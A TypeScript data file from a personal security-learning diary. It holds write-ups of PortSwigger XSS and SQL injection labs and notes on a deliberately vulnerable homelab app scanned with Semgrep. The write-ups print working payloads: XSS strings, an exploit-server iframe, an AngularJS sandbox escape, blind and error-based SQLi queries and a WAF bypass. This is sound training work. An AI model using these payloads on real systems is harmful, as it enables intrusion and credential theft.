export interface DiaryLab {
  title: string
  notes: string[]
  solution: string
  /** Whether the lab was fully solved. Some blind/OAST labs are blocked behind Burp Pro. */
  status?: 'completed' | 'in-progress' | 'blocked'
  /** Path to a reference screenshot, relative to src/assets, e.g. 'Burp/Lab10.png' */
  screenshot?: string
  /** Additional reference screenshots, relative to src/assets. Rendered after `screenshot`. */
  screenshots?: string[]
  /** Path to an accompanying automation script, relative to src/assets, e.g. 'LabScripts/sqli_solver.py' */
  script?: string
}

export interface DiaryEntry {
  id: string
  /** ISO date string, e.g. '2026-07-28'. Used for sorting. */
  date: string
  category: string
  /** Broad vulnerability class this entry belongs to, used for filtering (e.g. 'SQL Injection', 'XSS'). */
  vulnTypes: string[]
  title: string
  /** What you actually did that day. */
  workedOn: string[]
  /** Intro or reflection before lab breakdown. */
  body: string[]
  /** Per-lab write-ups with solutions. */
  labs?: DiaryLab[]
  tools?: string[]
  tags?: string[]
  link?: { label: string; url: string }
  milestone?: boolean
  screenshot?: string
  screenshots?: string[]
}

/**
 * Add new posts at the top of this array (newest first).
 * Keep dates as YYYY-MM-DD so sorting stays correct.
 */
export const cyberDiaryEntries: DiaryEntry[] = [
  {
    id: 'appsec-homelab-entry-7-mini-pc-setup',
    date: '2026-09-02',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'AppSec Homelab Entry 7: mini PC setup and SSH hardening',
    workedOn: [
      'Set up the mini PC (shipped with Linux Mint) as the base for the AppSec homelab, and decided to keep Mint rather than wipe to Ubuntu Server',
      'Diagnosed a "no signal" display fault after boot - turned out to be the HDMI cable, not GRUB or the graphics drivers',
      'Diagnosed SSH connection failures from my Mac - a stale IP address and the wrong username, not a network or firewall problem',
      'Hardened SSH: key-based auth only, password and root login disabled, ufw enabled, fail2ban installed',
      'Installed Docker on the mini PC over SSH from the Mac',
    ],
    body: [
      'The mini PC arrived today. It came with Linux Mint pre-installed and I decided to keep it rather than wipe to Ubuntu Server. It is Ubuntu underneath, so apt and Docker tooling are identical, and the only cost is a bit more overhead from the desktop environment. Most of the day went into troubleshooting rather than the hardening steps themselves.',
      'First boot got to the desktop and then the monitor lost signal entirely. I booted into the GRUB console (Shift or Esc at boot) to check for a corrupted bootloader: ls showed both partitions (hd0,gpt1 and hd0,gpt2) present and healthy, and grub.cfg was intact on gpt2, so the disk and GRUB were fine. I then suspected a graphics driver issue, since the signal dropped right as the desktop environment loaded, just after the login screen. That was also a dead end. It was the cable. Swapping HDMI for DisplayPort fixed it outright. Next time, check the cable before the drivers or GRUB.',
      'Then set up SSH on the mini PC, tried to connect from my Mac, and got connection timeouts followed by "no route to host". I confirmed the Mac and mini PC were on the same subnet (192.168.88.x), confirmed sshd was running (systemctl status ssh showed active), and confirmed ufw was not blocking it (inactive at the time). The real problem was the IP address: I was using 192.168.88.225, which was stale, and the current address was 192.168.88.13. On DHCP, re-check ip a fresh rather than trusting an address from a few minutes earlier.',
      'The other half of that was the username. I was trying to connect as charlesgoodsir, but the account on the mini PC is owner. Once corrected, ssh-copy-id and key-based login worked cleanly.',
      'Hardening done today: SSH key-based authentication set up with ssh-copy-id from the Mac; password authentication and root login disabled in sshd_config (PasswordAuthentication no, PermitRootLogin no); key-only login verified in a second terminal before closing the first, so I did not lock myself out; ufw installed and enabled with OpenSSH explicitly allowed; fail2ban installed and running.',
      'With key login working, installed Docker on the mini PC entirely over SSH from the Mac. No keyboard or monitor on the box from here.',
      'Still to do: a DHCP reservation on the router for 192.168.88.13 so the IP stops shifting, then deploy the homelab vulnerable app on this box and point OWASP ZAP at it to complete the DAST layer of the CI/CD pipeline.',
      'Most of today went on ruling out bootloader, driver, network, and firewall causes before landing on the simple ones: a bad cable, a stale IP, a wrong username. That is what the work usually looks like. Writing up the diagnosis path in the repo is worth more than a list of the commands that ran.',
    ],
    screenshot: 'Burp/HomeLab1.webp',
    tools: ['Linux Mint', 'GRUB', 'OpenSSH', 'ufw', 'fail2ban'],
    tags: [
      'AppSec homelab',
      'Linux',
      'SSH hardening',
      'ufw',
      'fail2ban',
      'troubleshooting',
    ],
  },
  {
    id: 'portswigger-xss-labs-6-8',
    date: '2026-09-02',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title:
      'Cross-Site Scripting (XSS) Labs 6-8 (jQuery sinks + encoded attribute)',
    workedOn: [
      'Kept going on the PortSwigger XSS path, Labs 6 through 11',
      'Labs 6 and 7: DOM XSS through jQuery sinks - an .attr() href sink and a hashchange selector sink',
      'Labs 8 to 10: reflected and stored XSS where the filter encodes angle brackets, so the way in is breaking out of an attribute or a JavaScript string',
      'Lab 11: first practitioner-level lab, DOM XSS through an AngularJS expression',
    ],
    body: [
      'More XSS today, and the labs move from the jQuery sinks into filters that encode angle brackets. Once a fresh tag is off the table, the pattern becomes: work out exactly what context the value lands in - an href, a JavaScript string, an Angular expression - and break out of that instead.',
      'Lab 7 was the long one. Getting an alert in the console was quick. Turning that into something that fires for another user meant working out how to make the hashchange event trigger on its own, which is where the exploit-server iframe comes in.',
      "Lab 11 is the first practitioner-level lab and the first time the target is a framework I do not use. It is an AngularJS app, and the payload works by reaching Angular's scope through $eval and the Function constructor. Did it as a code-along. The takeaway that stuck: moving into security means I cannot just know React and C# well, I need enough of a model of jQuery, AngularJS, and whatever else to spot where they go wrong.",
    ],
    labs: [
      {
        title:
          'Lab 6: DOM XSS in jQuery anchor href attribute sink using location.search source',
        notes: [
          'The vulnerable link is the "Back" link on the Submit Feedback form. There are a few back links around the site, but that is the only one actually labelled "back".',
          "The sink reads the returnPath query param and drops it straight into the href: $('#backLink').attr(\"href\", (new URLSearchParams(window.location.search)).get('returnPath')).",
          'Clicking the link normally just navigates to "/" via that value.',
          'The value lands inside the href attribute with no clean way to break out of it, so the move is to run JS inside the attribute with a javascript: URL instead.',
          'The lab wants document.cookie in the alert, so returnPath=javascript:alert(document.cookie). Loading that URL and clicking the Back link fires the alert and shows the DOM has been manipulated.',
        ],
        solution:
          '/feedback?returnPath=javascript:alert(document.cookie)\n\nSet as the returnPath param; the alert fires on clicking the Back link.',
        status: 'completed',
        screenshot: 'Burp/Lab6XSS.png',
      },
      {
        title:
          'Lab 7: DOM XSS in jQuery selector sink using a hashchange event',
        notes: [
          'On the blog. The hashchange handler decodes window.location.hash and concatenates it straight into a jQuery selector:',
          "$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); });",
          'Played with it in the console first. window.location.hash shows the hash; .slice(1) strips the leading #. Forgot the (1) on the first go and got an error, then it returned the raw value without the #.',
          'The selector looks for an h2 whose text contains the hash value, so a matching value scrolls the page to that heading.',
          'Passing an HTML string into :contains() makes jQuery build a detached element rather than match one. `$(\'section.blog-list h2:contains(<img src="0" onerror="alert()">)\')` returns a node even though nothing on the page matches it.',
          'Confirmed the detached element is live by setting myimg.src = 0 in the console, which fired a request that timed out with a 504.',
          'A real user will not change the hash by hand, so the payload has to trigger hashchange itself. Used the exploit server to deliver an iframe that appends to its own src after it loads:',
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>',
          'Tested it, confirmed print() fired, then delivered it to the victim.',
        ],
        solution:
          '<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>\n\nDelivered from the exploit server.',
        status: 'completed',
        screenshot: 'Burp/Lab7XSS.png',
        screenshots: ['Burp/Lab7XSS2.png'],
      },
      {
        title:
          'Lab 8: Reflected XSS into attribute with angle brackets HTML-encoded',
        notes: [
          'Uses the blog search box. Searching for p3p returns no results, but p3p shows up in the DOM inside the search form value attribute.',
          'Angle brackets come back HTML-encoded, so a new tag will not work. Quotes are not encoded, so the way in is to break out of the value attribute and add an event handler.',
          "p3p\" onmouseover='alert()' closes the attribute and adds an onmouseover. Hovering the search box fires the alert.",
        ],
        solution: "p3p\" onmouseover='alert()'",
        status: 'completed',
        screenshot: 'Burp/Lab8XSS.png',
        screenshots: ['Burp/Lab8XSS2.png'],
      },
      {
        title:
          'Lab 9: Stored XSS into anchor href attribute with double quotes HTML-encoded',
        notes: [
          'First stored attack in this batch. The payload gets saved and sits there until another user triggers it, rather than firing on my own request.',
          "On the blog comment form, the website field is rendered back as the href of a link on the commenter's name, so other users can visit their site.",
          'Double quotes come back HTML-encoded, so breaking out of the attribute is off the table, but a javascript: URL still works as the href value.',
          'Put javascript:alert() in the website field. The alert fires when someone clicks the name link on the comment.',
        ],
        solution: 'javascript:alert()',
        status: 'completed',
        screenshot: 'Burp/Lab9XSS.png',
        screenshots: ['Burp/Lab9XSS2.png'],
      },
      {
        title:
          'Lab 10: Reflected XSS into a JavaScript string with angle brackets HTML encoded',
        notes: [
          'The search term is reflected into a JavaScript string literal, not HTML:',
          "var searchTerms = 'p3p'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '\">');",
          'Angle brackets are HTML-encoded so a new tag will not land, but the single quote is not encoded, so I can close the string and add my own code.',
          "Searched p3p'; alert(); and checked the DOM. The string closed cleanly and the alert call was sitting there as its own statement.",
          "Tidied it so the rest of the line stays valid JavaScript: p3p'; alert(); let cake = 'test re-opens a string for the trailing '; so nothing after it throws a syntax error.",
        ],
        solution:
          "p3p'; alert(); let cake = 'test\n\nAlso works as a self-contained break-in: '-alert()-'",
        status: 'completed',
        screenshot: 'Burp/Lab10XSS.png',
      },
      {
        title:
          'Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded',
        notes: [
          'First practitioner-level lab, and the first one on a framework I do not use.',
          'The search box sits inside an AngularJS app. Tested {{ 1+1 }} and it rendered 2, so Angular is evaluating template expressions in the reflected value.',
          'Angle brackets and double quotes are both encoded, so the classic tag or attribute injection is blocked. The way in is an Angular expression that reaches back out to JavaScript.',
          "{{ $eval.constructor('alert()')() }} uses $eval's constructor (the Function constructor) to build a function that runs alert() and calls it.",
          'Did this one as a code-along. The part worth keeping: Angular expressions run against a scope, and $eval plus the Function constructor is the bridge from that scope back to normal JS. Something to come back to when I hit more sandbox-escape labs.',
        ],
        solution: "{{ $eval.constructor('alert()')() }}",
        status: 'completed',
        screenshot: 'Burp/Lab11XSS.png',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'DOM XSS',
      'reflected XSS',
      'stored XSS',
      'jQuery',
      'AngularJS',
      'hashchange',
      'javascript: URI',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-xss-labs-2-5',
    date: '2026-09-01',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title: 'Cross-Site Scripting (XSS) Labs 2-5 (stored XSS + DOM XSS)',
    workedOn: [
      'Back into the PortSwigger XSS path after a holiday break - completed Labs 2 through 5',
      'Lab 2: stored XSS via a blog comment field with no output encoding',
      'Labs 3-5: DOM-based XSS through document.write and innerHTML sinks fed from location.search',
    ],
    body: [
      "Back from a long holiday and easing back into the PortSwigger labs and Burp while I wait on a mini PC to arrive - that one's going to become a Cyber home lab for standing up my own exploitable apps to practice against.",
      'Picking the XSS path back up from where I left off at Lab 1. Labs 2-5 move from a straightforward stored XSS into DOM-based XSS, where the bug lives entirely in client-side JavaScript handling the URL and the server never sees the payload.',
      'The through-line for the DOM labs: find the sink (document.write, innerHTML), work out how the URL feeds into it, then shape the payload to break out of whatever HTML context it lands in. innerHTML has its own quirk on top of that - a <script> tag assigned through it shows up in the DOM but never executes, so event handlers like onerror/onload have to do the work instead.',
    ],
    labs: [
      {
        title: 'Lab 2: Stored XSS into HTML context with nothing encoded',
        notes: [
          'The blog comment form stores input and renders it straight back into the page with nothing encoded.',
          'Tested with a plain <h1> tag first - refreshed the blog and the comment came back as a styled header, confirming HTML injection works here.',
          "Because it's stored, the <script> payload doesn't fire on submit - it triggers when the comments page is reloaded and the stored markup is served back.",
        ],
        solution:
          '<script>alert()</script>\n\nPosted as a blog comment; alert fires on reloading the comments page.',
        status: 'completed',
      },
      {
        title:
          'Lab 3: DOM XSS in document.write sink using source location.search',
        notes: [
          'First DOM-based lab - the payload never touches the server, the vulnerability is entirely in the client-side JS that handles the URL.',
          "Searching 'cake' returned no results, but the search term still got written into the page by trackSearch() via document.write().",
          "The sink: document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+query+'\">') with query pulled straight from location.search.",
          'Breaking out of the src attribute with a double quote lets me add my own onload handler - the trailing quote isn\'t needed because the sink appends the closing "> itself.',
        ],
        solution: 'cake" onload="alert()',
        status: 'completed',
      },
      {
        title:
          'Lab 4: DOM XSS in document.write sink using source location.search inside a select element',
        notes: [
          'Same document.write sink as Lab 3, but the injection point is inside a <select> stock-checker, so the payload has to break out of the select/option elements first.',
          'The script reads storeId from the query string and writes it into <option selected>...</option>.',
          "Generic words like 'cake' didn't visibly register - used a unique value (p3p) so I could clearly see it land as the selected option in both the rendered dropdown and the DOM.",
          'Closed the select with </select>, then added an <img> with a broken src so onerror fires the alert. URL-encoded the whole thing so it survives in the query string.',
        ],
        solution:
          "?productId=1&storeId=p3p</select><img src='1' onerror='alert()'>\n\nURL-encoded:\n?productId=1&storeId=p3p%3C/select%3E%3Cimg%20src=%271%27%20onerror=%27alert()%27%3E",
        status: 'completed',
        screenshot: 'Burp/Lab4XSS.png',
        screenshots: ['Burp/Lab4XSS2.png'],
      },
      {
        title: 'Lab 5: DOM XSS in innerHTML sink using source location.search',
        notes: [
          'Sink is element.innerHTML = query instead of document.write - doSearchQuery() drops the search term straight into <span id="searchMessage">.',
          "A <script> tag assigned via innerHTML shows up in the DOM but never runs - browsers don't execute script elements inserted that way.",
          'Used an <img> with an invalid src so the onerror handler runs instead - no need to touch the URL, typing it into the search box is enough.',
        ],
        solution: "<img src='0' onerror='alert()'>",
        status: 'completed',
        screenshot: 'Burp/Lab5XSS.png',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'stored XSS',
      'DOM XSS',
      'document.write',
      'innerHTML',
      'JavaScript',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'appsec-homelab-entry-6-documented-false-negative',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title:
      'AppSec Homelab Entry 6: leaving the AuthController SQLi as a documented false negative',
    workedOn: [
      'Reverted AuthController.cs back to its original, realistic [FromBody] login endpoint after the Entry 5 investigation',
      'Confirmed the SQL injection is still fully exploitable, and confirmed the pipeline still does not flag it',
      'Documented the gap directly in the repo README rather than changing the endpoint to make the pipeline look more complete than it is',
    ],
    body: [
      'Closing the loop from Entry 5. Reverted AuthController.cs back to its original [FromBody] LoginRequest shape - the realistic version of a login endpoint, not the [FromQuery] version used purely to isolate the cause.',
      "Rebuilt, re-ran, and confirmed administrator'-- still logs in as admin. The vulnerability was never in question - only whether Semgrep would see it, and it doesn't. Same pipeline, same rule, same file: ProductsController.cs still gets flagged, AuthController.cs still doesn't.",
      "Decided against changing the endpoint shape to force a green pipeline. The point of this repo is to show real vulnerabilities and real tool behaviour around them, not to optimise for a clean Actions run. Instead, added a note directly in the README calling out AuthController.cs as a known false negative, with a link back to the Entry 5 investigation explaining exactly why - so anyone reviewing the repo (or the pipeline output) understands it's a documented gap, not an oversight.",
    ],
    tools: ['Semgrep', '.NET / C#', 'GitHub Actions'],
    tags: ['AppSec homelab', 'SQL injection', 'Semgrep', 'SAST limitations'],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-5-semgrep-frombody-gap',
    date: '2026-08-06',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title:
      'AppSec Homelab Entry 5: why Semgrep caught one SQLi and missed the other',
    workedOn: [
      'Investigated why Semgrep flagged the SQL injection in ProductsController.cs but not the structurally identical one in AuthController.cs',
      'Ran Semgrep locally (CLI) against isolated versions of the file to test hypotheses one variable at a time',
      'Identified the root cause: the rule does not treat [FromBody]-bound request objects as a tainted source',
    ],
    body: [
      "This one's been parked since Entry 4 - Semgrep caught the SQLi in ProductsController.cs immediately but said nothing about the same pattern in AuthController.cs. Set out today to actually find out why instead of assuming it was just a coverage gap.",
      'Installed Semgrep locally so I could test changes in seconds instead of pushing to GitHub Actions each time. First step was confirming a control: ran the same rule against ProductsController.cs alone, and it still flagged - so single-file scanning was a valid way to test this, not the cause of the mismatch itself.',
      'Then worked through the differences between the two files one at a time, changing exactly one thing per test and re-scanning:',
      "1. Property access - pulled request.Username/request.Password into plain local variables before interpolating them, in case Semgrep's taint tracking couldn't follow a property dereference. No change - still not flagged.",
      '2. Variable count - reduced the query to a single interpolated value instead of two, in case a multi-variable AND clause was the issue. No change.',
      "3. Clause style - swapped the equality check (Username = '...') for a LIKE '%...%' clause, matching ProductsController.cs's exact style. No change.",
      '4. Record position - moved the LoginRequest record declaration outside the class body, in case a nested record type was interfering with the method analysis. No change.',
      '5. Binding source - swapped [FromBody] LoginRequest request for two plain [FromQuery] string parameters, keeping the exact same SQL string. This one flagged immediately.',
      "That's the answer: Semgrep's csharp-sqli rule tracks taint from [FromQuery]/[FromRoute]-style parameters, but doesn't recognise a [FromBody]-bound complex object as a tainted source at all. It's not about how the SQL string is built - it's about whether the rule ever considers the input untrusted in the first place. Since request.Username never gets marked as tainted, nothing downstream matters, which is why every SQL-string-shaped test came back negative until the binding source itself changed.",
      "This is a real, meaningful gap rather than a quirk - POST-body JSON is the standard way virtually every modern REST API accepts login credentials, and it's exactly the shape that slipped past the default OWASP ruleset here. A GET-with-query-params endpoint doing the identical vulnerable thing gets caught instantly.",
      'Reverted AuthController.cs back to the original [FromBody] version afterwards - the whole point of this app is to keep the vulnerabilities in their most realistic form, and that includes keeping the miss visible for now rather than quietly changing the endpoint shape to make the pipeline look more complete than it is.',
    ],
    tools: ['Semgrep (CLI)', '.NET / C#'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'Semgrep',
      'SAST limitations',
      'taint analysis',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-4-first-pipeline-run',
    date: '2026-08-01',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection', 'XSS'],
    title:
      'AppSec Homelab Entry 4: building the vulnerable app and running the first pipeline scan',
    workedOn: [
      'Built a bare-bones vulnerable-by-design app (.NET/C# backend, TypeScript/React frontend) to test what I learned in the PortSwigger SQLi and XSS labs',
      'Debugged the app from first build errors through to a working login and product search',
      'Manually confirmed the SQLi login bypass and reflected XSS both work as intended',
      'Added a GitHub Actions workflow running Semgrep, and fixed the first real finding it produced',
    ],
    body: [
      "Started today by testing out what I've learned from the labs with SQLi and XSS. Created a new repo specifically for an app that's deliberately vulnerable to these attacks - a bare-bones product search on the main page, with a login that can be bypassed via SQLi.",
      "Haven't done C# in a while, so this doubled as shaking off the cobwebs. Had some assistance from Claude to help jog my memory on different things. Hit a lot of errors getting it building for the first time - login didn't work, product search didn't work. Most were easy fixes once I found them: references not resolving, spelling mistakes, and issues connecting the backend to the frontend.",
      "Once it was up and running, I could actually test what I'd learned: logging in with administrator'-- and a random password logged me in as admin, and searching <img src=x onerror=alert(1)> triggered the alert. One thing the PortSwigger labs never show is what the code actually looks like behind a vulnerability like this - seeing the raw string concatenation that causes it was genuinely useful in a way reading about it isn't.",
      'After committing everything, I set up a GitHub Actions workflow with Semgrep to catch issues automatically. It picked up the SQL injection in ProductsController.cs immediately, which was great to see work. It did NOT flag the XSS in the frontend, though - something to dig into and tweak the ruleset for next time.',
      'The genuinely unexpected find was a second blocking issue, unrelated to the app itself: the workflow file was using a mutable actions/checkout@v4 tag rather than a pinned commit SHA, which Semgrep flagged as a supply chain risk (A03:2025 - Software Supply Chain Failures) - tags and branch refs can be silently repointed by the action owner, which is exactly how the trivy-action and kics-github-action compromises happened. Fixed it by pinning to the full SHA: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.',
      "That's as far as I got this round. Next step is figuring out why the XSS didn't get flagged and tweaking the Semgrep config to catch it too.",
    ],
    tools: [
      '.NET / C#',
      'TypeScript',
      'React',
      'SQLite',
      'GitHub Actions',
      'Semgrep',
    ],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'XSS',
      'CI/CD pipeline',
      'Semgrep',
      'software supply chain',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
    screenshots: [
      'Homelab/SQLiHomeLabDay1.png',
      'Homelab/XSSHomeLabDay1.png',
      'Homelab/WorkflowRunningDay1.png',
      'Homelab/FirstWorkflowResultDay1.png',
    ],
  },
  {
    id: 'portswigger-xss-labs-1',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title: 'Cross-Site Scripting (XSS) Lab 1 (reflected XSS)',
    workedOn: [
      'Started the PortSwigger Cross-Site Scripting (XSS) learning path',
      'Completed Lab 1: reflected XSS into an HTML context with nothing encoded',
    ],
    body: [
      'First attempt at XSS after finishing the SQL injection path. Different mental model to SQLi - instead of manipulating a database query, the goal is getting the browser itself to execute a script that gets reflected back into the page unencoded.',
      'Went in with a rough idea from JavaScript that a <script> tag triggers execution, but the specifics of what actually fires in a browser context took a bit of trial and error.',
    ],
    screenshot: 'Burp/Lab1XSS.png',
    labs: [
      {
        title: 'Lab 1: Reflected XSS into HTML context with nothing encoded',
        notes: [
          "Started with <script>alert</script> - failed. Referencing alert on its own doesn't call it, it just refers to the function.",
          'Realised alert needs to actually be invoked as a function call: <script>alert(1)</script> - this fired the alert and solved the lab.',
          'Takeaway: the payload needs to be valid, executable JavaScript, not just the presence of a <script> tag - the same rule as writing normal JS in a console.',
        ],
        solution: '<script>alert(1)</script>',
        status: 'completed',
      },
    ],
    tools: ['Web Browser', 'Burp Suite'],
    tags: ['XSS', 'reflected XSS', 'JavaScript'],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-sqli-path-complete',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    milestone: true,
    title: 'SQL Injection learning path: complete (Community Edition)',
    workedOn: [
      'Finished every SQL injection lab reachable on Burp Suite Community Edition',
      'Labs 15 and 16 remain blocked - both need Burp Collaborator, which is Professional-only',
    ],
    body: [
      'Closing out the SQL injection learning path for now. Went from basic WHERE-clause tautologies through UNION attacks on Oracle, MySQL, and PostgreSQL, blind SQLi via conditional responses, conditional errors, and time delays, and a WAF bypass using XML encoding via Hackvertor.',
      'Labs 15 and 16 need Burp Collaborator, which sits behind a Professional licence. Flagging them as blocked rather than skipping past quietly - revisiting once I upgrade or find a trial window.',
    ],
    screenshot: 'Burp/CompletedSQLiLabs.png',
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
      'Python',
    ],
    tags: ['SQL injection', 'milestone', 'PortSwigger Web Security Academy'],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },

  {
    id: 'portswigger-sqli-labs-13-17',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title:
      'SQL Injection labs 13-17 (error-based, time-based blind, WAF bypass)',
    workedOn: [
      'Completed labs 13, 14, and 17 on the PortSwigger SQL injection path',
      'Made partial progress on lab 14 (time-based blind) and could not attempt labs 15-16 (out-of-band) on Burp Community Edition',
      'Used CAST()-based error leakage, pg_sleep() time delays, and the Hackvertor extension to bypass a WAF filter',
    ],
    body: [
      'Final session on the SQLi learning path for now. This batch moved from straightforward UNION attacks into blind techniques that lean on errors, timing, and filter evasion rather than direct data output.',
      'Biggest takeaway: blind SQLi is really just a slower version of the same logic - confirm the injection point, find a reliable true/false signal (an error, a delay, a message), then automate the character-by-character extraction because doing it by hand does not scale past a couple of characters.',
    ],

    labs: [
      {
        title: 'Lab 13: Visible error-based SQL injection',
        notes: [
          'Adding a single quote to the trackingId broke the query and returned a verbose Postgres error, confirming the injection point and leaking the underlying query structure.',
          'Followed the CAST() technique from the code-along to force type-conversion errors that leak data back through the error message.',
          "' AND 1=CAST((SELECT username FROM users) as int)-- initially failed because the subquery returned more than one row.",
          "Adding LIMIT 1 fixed it: ' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)-- leaked the first username directly in the Postgres error text.",
          'Repeated the same pattern against the password column to leak the credential.',
        ],
        solution:
          "' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--\n\nError message leaked the password directly.",
        status: 'completed',
      },
      {
        title:
          'Lab 14: Blind SQL injection with time delays and information retrieval',
        notes: [
          "Confirmed the injection with ' || pg_sleep(10)-- and timing the Repeater response - just over 10 seconds confirmed it.",
          "Built a conditional delay to ask true/false questions: ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- - first attempt failed from a missing END keyword.",
          'Used the same CASE pattern to confirm the administrator account exists, then started narrowing the password length (>1, >10, >20 all returned a 10s delay, then >20 came back instantly).',
          "Burp Intruder isn't available on Community Edition, so full character-by-character extraction still needs to be scripted rather than done manually.",
        ],
        solution:
          'Scripted the rest of the password using the sqli_solver.py script.',
        status: 'completed',
        script: 'LabScripts/lab14.py',
      },
      {
        title: 'Lab 15: Blind SQL injection with out-of-band interaction',
        notes: [
          'This lab needs Burp Collaborator for out-of-band interactions, which is a Burp Suite Professional feature.',
          'Parking this until I can justify the licence cost or find a free trial window.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 16: Blind SQL injection with out-of-band data exfiltration',
        notes: [
          'Same blocker as Lab 15 - out-of-band exfiltration needs Collaborator, which is Professional-only.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 17: SQL injection with filter bypass via XML encoding',
        notes: [
          'Intercepted the "Check Stock" request in Burp, which is where the XML-based injection point lives.',
          'A plain UNION SELECT NULL got blocked immediately with a 403 "Attack detected" response from the filter.',
          'Installed the Hackvertor extension in Burp and encoded the payload with hex_entities, which let the request through with a 200.',
          "Confirmed the injection point with an extra NULL, then used concatenation to get both fields out through the single visible field: UNION SELECT username || '~' || password FROM users.",
        ],
        solution:
          "UNION SELECT username || '~' || password FROM users\n\nCredentials found:\ncarlos~g6eafkale8omhjqkm6o7\nadministrator~ybqknjr1xvaa80bk7trd\nwiener~4hnvro74rym1ileky75x",
        status: 'completed',
      },
    ],
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
    ],
    tags: [
      'SQL injection',
      'error-based SQLi',
      'blind SQLi',
      'time-based blind',
      'WAF bypass',
      'PostgreSQL',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-11-12',
    date: '2026-07-29',
    category: 'PortSwigger Labs',
    vulnTypes: ['SQL Injection'],
    title: 'SQL Injection labs 11-12 (blind, conditional responses and errors)',
    workedOn: [
      'Completed labs 11 and 12 on the PortSwigger SQL injection path',
      'Worked with blind SQL injection where no data or query error is returned directly to the page',
      'Wrote Python scripts to automate character-by-character password extraction, since Burp Intruder is not available on Community Edition',
    ],
    body: [
      'First real exposure to blind SQLi. Unlike the UNION labs, there is no data reflected on the page at all - the only signal is whether a "Welcome back" message appears or not, so the whole approach shifts to asking the database true/false questions one bit at a time.',
      'Doing this by hand for a 20-character password is not realistic, so this session doubled as an excuse to write my first proper SQLi automation scripts in Python.',
    ],
    labs: [
      {
        title: 'Lab 11: Blind SQL injection with conditional responses',
        notes: [
          "Confirmed the tracking cookie feeds into the query by appending ' and 1=1--' and comparing the response against 1=0.",
          "Confirmed a users table exists with: ' and (select 'x' FROM users LIMIT 1)='x'--",
          "Confirmed the administrator account exists with: ' and (select username FROM users WHERE username='administrator')='administrator'--",
          'Realised that comparing the password directly to a guess would just be brute-forcing the login form through the back door, so length and character enumeration was the way to go.',
          'Narrowed the password length with LENGTH(password)>N checks (true past 6, 10, and 15, false past 20), confirming 20 characters.',
          "Burp Intruder isn't available on Community Edition, so wrote a Python script to automate the substring(password,1,1) character comparisons instead of doing it manually.",
        ],
        solution:
          "' and (select username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--\n\nExtracted character-by-character via script.\n\nCredentials found:\nadministrator\nkk9s1reehirw9tayifqx",
        status: 'completed',
        script: 'LabScripts/sqli_solver.py',
      },
      {
        title: 'Lab 12: Blind SQL injection with conditional errors',
        notes: [
          'Different flavour of blind SQLi - this one forces a database error instead of a conditional message.',
          "Confirmed Oracle with: TrackingId=...' || (select '' FROM dual) || '",
          "Confirmed the users table exists using rownum so the query doesn't break: ' || (select '' FROM users WHERE rownum=1) || '",
          "Checking WHERE username='administrator' directly always returned 200 regardless of whether it matched, so a conditional error was needed instead.",
          "Built a CASE WHEN that only throws a divide-by-zero error when the condition is true: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '",
          'First attempt failed from a missing (1/0) and a stray space in TO_CHAR.',
